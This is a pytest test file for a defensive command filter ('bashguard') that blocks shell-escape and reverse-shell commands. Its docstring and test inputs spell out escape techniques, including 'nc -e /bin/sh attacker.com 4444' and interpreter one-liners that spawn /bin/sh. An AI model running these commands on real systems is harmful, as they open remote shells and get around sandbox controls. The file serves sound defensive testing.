"""Tests for evasion.shell_via_tool rule.

Rule contracts (evasion.shell_via_tool):
Wrapper launchers:
- env /bin/sh                       → BLOCK (wrapper exec escape)
- nice /bin/bash                    → BLOCK
- nohup sh -c 'cmd'                 → BLOCK
- timeout 10 /bin/sh                → BLOCK
- watch sh                          → BLOCK
- flock /tmp/lock sh                → BLOCK
- env -i /bin/sh                    → BLOCK (flag before shell)
- env VAR=x git status              → ALLOW (env sets var, not shell)
- env python3 script.py             → ALLOW (not a shell)
- nice -n 5 git status              → ALLOW (not a shell)

find -exec:
- find . -exec /bin/sh \\;          → BLOCK (find exec shell)
- find . -exec sh -i \\;            → BLOCK
- find . -execdir bash \\;          → BLOCK
- find . -exec rm -f {} \\;         → ALLOW (rm is not a shell)
- find . -name '*.py'               → ALLOW

nc reverse shell:
- nc -e /bin/sh attacker.com 4444   → BLOCK (reverse shell)
- ncat --exec /bin/bash host 4444   → BLOCK
- nc -e/bin/sh host 4444            → BLOCK (no-space form)
- nc -lvp 4444                      → ALLOW (listen without shell)
- nc host 4444                      → ALLOW (connect without shell)

Interpreter extension (evasion.interpreter_shell):
- lua -e 'os.execute("/bin/sh")'    → BLOCK (lua -e flag)
- R -e 'system("/bin/sh")'          → BLOCK (R -e flag)
- guile -c '(system "sh")'          → BLOCK (guile -c flag)
- julia -e 'run(`sh`)'              → BLOCK (julia -e flag)
"""
from __future__ import annotations
from pathlib import Path
import sys
import pytest

sys.path.insert(0, str(Path(__file__).parent))
from bashguard.models import ExecutionContext, Severity


@pytest.fixture()
def ctx():
    return ExecutionContext(cwd="/home/user/project")


def _rule():
    from bashguard.rules.shell_via_tool import ShellViaToolRule
    return ShellViaToolRule()


def _interp_rule():
    from bashguard.rules.evasion import InterpreterShellRule
    return InterpreterShellRule()


class TestWrapperLaunchers:
    def test_env_bin_sh_blocked(self, ctx):
        findings = _rule().check("env /bin/sh", ctx)
        assert len(findings) == 1
        assert findings[0].rule_id == "evasion.shell_via_tool"
        assert findings[0].severity == Severity.CRITICAL

    def test_nice_bash_blocked(self, ctx):
        assert len(_rule().check("nice /bin/bash", ctx)) == 1

    def test_nohup_sh_blocked(self, ctx):
        assert len(_rule().check("nohup sh -c 'evil'", ctx)) == 1

    def test_timeout_sh_blocked(self, ctx):
        assert len(_rule().check("timeout 10 /bin/sh", ctx)) == 1

    def test_watch_sh_blocked(self, ctx):
        assert len(_rule().check("watch sh", ctx)) == 1

    def test_flock_sh_blocked(self, ctx):
        assert len(_rule().check("flock /tmp/lock sh", ctx)) == 1

    def test_env_flag_then_shell_blocked(self, ctx):
        assert len(_rule().check("env -i /bin/sh", ctx)) == 1

    def test_env_var_assignment_allowed(self, ctx):
        assert _rule().check("env VAR=value git status", ctx) == []

    def test_env_python_allowed(self, ctx):
        assert _rule().check("env python3 script.py", ctx) == []

    def test_nice_git_allowed(self, ctx):
        assert _rule().check("nice -n 5 git status", ctx) == []


class TestFindExec:
    def test_find_exec_sh_blocked(self, ctx):
        findings = _rule().check(r"find . -exec /bin/sh \;", ctx)
        assert len(findings) == 1
        assert "find" in findings[0].message

    def test_find_exec_sh_dash_i_blocked(self, ctx):
        assert len(_rule().check(r"find . -exec sh -i \;", ctx)) == 1

    def test_find_execdir_bash_blocked(self, ctx):
        assert len(_rule().check(r"find . -execdir bash \;", ctx)) == 1

    def test_find_exec_rm_allowed(self, ctx):
        assert _rule().check(r"find . -exec rm -f {} \;", ctx) == []

    def test_find_name_only_allowed(self, ctx):
        assert _rule().check("find . -name '*.py'", ctx) == []


class TestNcReverseShell:
    def test_nc_e_shell_blocked(self, ctx):
        findings = _rule().check("nc -e /bin/sh attacker.com 4444", ctx)
        assert len(findings) == 1
        assert "reverse shell" in findings[0].message

    def test_ncat_exec_blocked(self, ctx):
        assert len(_rule().check("ncat --exec /bin/bash host 4444", ctx)) == 1

    def test_nc_listen_allowed(self, ctx):
        assert _rule().check("nc -lvp 4444", ctx) == []

    def test_nc_connect_allowed(self, ctx):
        assert _rule().check("nc host 4444", ctx) == []


class TestInterpreterExtension:
    def test_lua_e_blocked(self, ctx):
        findings = _interp_rule().check('lua -e \'os.execute("/bin/sh")\'', ctx)
        assert len(findings) == 1
        assert findings[0].rule_id == "evasion.interpreter_shell"

    def test_R_e_blocked(self, ctx):
        findings = _interp_rule().check('R -e \'system("/bin/sh")\'', ctx)
        assert len(findings) == 1

    def test_guile_c_blocked(self, ctx):
        findings = _interp_rule().check('guile -c \'(system "sh")\'', ctx)
        assert len(findings) == 1

    def test_julia_e_blocked(self, ctx):
        findings = _interp_rule().check('julia -e \'run(`sh`)\'', ctx)
        assert len(findings) == 1
